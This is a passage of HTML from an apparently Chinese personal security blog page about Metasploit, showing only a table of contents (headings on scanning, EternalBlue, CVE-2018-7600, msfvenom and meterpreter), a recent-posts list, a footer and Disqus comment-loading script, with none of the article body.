class="toc-number">1.2.2.</span> <span class="toc-text">简单使用：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%EF%BC%8C%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.</span> <span class="toc-text">3，情报收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">主机发现与端口扫描：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%9F%A5%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AF%A6%E7%BB%86%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">探查服务的详细版本：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9%EF%BC%9A"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">服务查点：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9%EF%BC%9A"><span class="toc-number">1.3.0.3.1.</span> <span class="toc-text">ssh服务查点：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%EF%BC%8C%E4%B8%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.</span> <span class="toc-text">4，主动渗透攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%EF%BC%9A%E7%BB%8F%E5%85%B8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BB%EF%BC%88445%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">例1：经典永恒之蓝攻击（445端口）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2%EF%BC%9ACVE-2018-7600-DC-1-web"><span class="toc-number">1.4.2.</span> <span class="toc-text">例2：CVE-2018-7600(DC-1,web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%84%E4%BB%B7%EF%BC%9A"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">评价：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%EF%BC%8C%E8%A2%AB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.</span> <span class="toc-text">5，被动渗透攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#office-cve-2017-11882%EF%BC%9A"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">office_cve_2017_11882：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%EF%BC%8Cmsfvenom"><span class="toc-number">1.6.</span> <span class="toc-text">6，msfvenom</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">常用参数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">举例：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%EF%BC%8Cmeterpreter"><span class="toc-number">1.7.</span> <span class="toc-text">7，meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E4%BC%98%E5%8A%BF%EF%BC%9A"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">技术优势：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B9%B3%E5%8F%B0%E9%80%9A%E7%94%A8%E6%80%A7%EF%BC%9A"><span class="toc-number">1.7.0.1.1.</span> <span class="toc-text">平台通用性：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BA%AF%E5%86%85%E5%AD%98%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.7.0.1.2.</span> <span class="toc-text">纯内存工作模式：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%81%B5%E6%B4%BB%E4%B8%94%E5%8A%A0%E5%AF%86%E7%9A%84%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.7.0.1.3.</span> <span class="toc-text">灵活且加密的通信协议：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%93%E4%BA%8E%E6%89%A9%E5%B1%95%EF%BC%9A"><span class="toc-number">1.7.0.1.4.</span> <span class="toc-text">易于扩展：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">常用基本命令：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/23837ad8.html" title="HTB-Driver">HTB-Driver</a><time datetime="2024-11-22T15:52:37.000Z" title="发表于 2024-11-22 23:52:37">2024-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/98ed62e4.html" title="vulntarget-k靶场">vulntarget-k靶场</a><time datetime="2024-11-19T04:25:59.000Z" title="发表于 2024-11-19 12:25:59">2024-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/93eb49a0.html" title="docker的简单使用">docker的简单使用</a><time datetime="2024-11-15T16:53:44.000Z" title="发表于 2024-11-16 00:53:44">2024-11-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/57d5375c.html" title="DC-1,DC-2,DC-3靶场记录--反弹shell">DC-1,DC-2,DC-3靶场记录--反弹shell</a><time datetime="2024-11-15T16:43:47.000Z" title="发表于 2024-11-16 00:43:47">2024-11-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/50aa4c3b.html" title="Metasploit简介及使用">Metasploit简介及使用</a><time datetime="2024-11-15T16:36:16.000Z" title="发表于 2024-11-16 00:36:16">2024-11-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/shuai.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By icon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="/">icon</a> is striving to become stronger!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo

  const disqusReset = conf => {
    window.DISQUS && window.DISQUS.reset({
      reload: true,
      config: conf
    })
  }

  const loadDisqus = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyDisqus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    window.disqus_identifier = isShuoshuo ? path : '/posts/50aa4c3b.html'
    window.disqus_url = isShuoshuo ? location.origin + path : 'https://iconabc.github.io/posts/50aa4c3b.html'

    const disqus_config = function () {
      this.page.url = disqus_url
      this.page.identifier = disqus_identifier
      this.page.title = 'Metasploit简介及使用'
    }

    if (window.DISQUS) disqusReset(disqus_config)
    else {
      const script = document.createElement('script')
      script.src = 'https://.disqus.com/embed.js'
      script.setAttribute('data-timestamp', +new Date())
      document.head.appendChild(script)
    }

    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
  }

  const getCount = async() => {
    try {
      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
      if (!eleGroup) return
      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')

      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
        method: 'GET'
      })
      const result = await res.json()

      const count = result.response.length ? result.response[0].posts : 0
      eleGroup.textContent = count
    } catch (err) {
      console.error(err)
    }
  }

  if (isShuoshuo) {
    'Disqus' === 'Disqus'
      ? window.shuoshuoComment = { loadComment: loadDisqus }
      : window.loadOtherComment = loadDisqus
    return
  }

  if ('Disqus' === 'Disqus' || !false) {
    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
    else {
      loadDisqus()
      
    }
  } else {
    window.loadOtherComment = loadDisqus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>